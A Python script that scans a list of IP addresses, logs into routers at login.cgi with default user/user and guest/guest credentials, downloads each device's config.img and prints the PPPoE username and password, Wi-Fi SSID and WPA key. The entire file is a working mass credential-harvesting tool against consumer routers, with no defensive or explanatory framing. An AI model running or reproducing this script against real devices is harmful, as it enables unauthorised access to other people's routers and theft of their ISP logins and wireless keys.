import requests
from bs4 import BeautifulSoup
from urllib.request import urlopen
import socket
import re


file = open(("IP.txt"),'r')

for line in file:

    IPR = line.split()
    IP = IPR[0]
    #Connecting Section
    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks.settimeout(0.5)
    try:
     socks.connect((IP,80))
    except:
     continue

    #Loggin In Section

    POSTREQ ="http://"+IP+"/login.cgi"
    Data = "username=user&password=user&year=2021&month=1&day=23&hour=0&min=52&sec=43&submit.htm?login.htm=Send"
    requests.post(POSTREQ, Data, timeout=1)
    Data = "username=guest&password=guest&year=2021&month=1&day=23&hour=0&min=52&sec=43&submit.htm?login.htm=Send"
    requests.post(POSTREQ, Data, timeout=1)
    print("Logging In ! :" , IP,"\n","=======" )

    # Reading Section

    cmd = ("http://"+IP+"/config.img")
    try:
     html = urlopen(cmd).read()
    except:
     print("Device Not Recognized")
     break
    #
    if re.search("parent.location=\"/login.htm\"",str(html)):
     print("Incorrect Password")

     break

    soup = BeautifulSoup(html, 'html.parser')
    tags = soup('v')

    # Searching Section

    for tag in tags:
        x = (tag.attrs)
        if "PPPUSER" in x.values() and len(x["v"]) > 0 or "PPPPASSWD" in x.values() and len(x["v"]) > 0 or "WLAN_ROOT_SSID" in x.values() or "WLAN_WPA_PSK" in x.values()  :
         print(x["n"],":",x["v"])
    print(" =======")


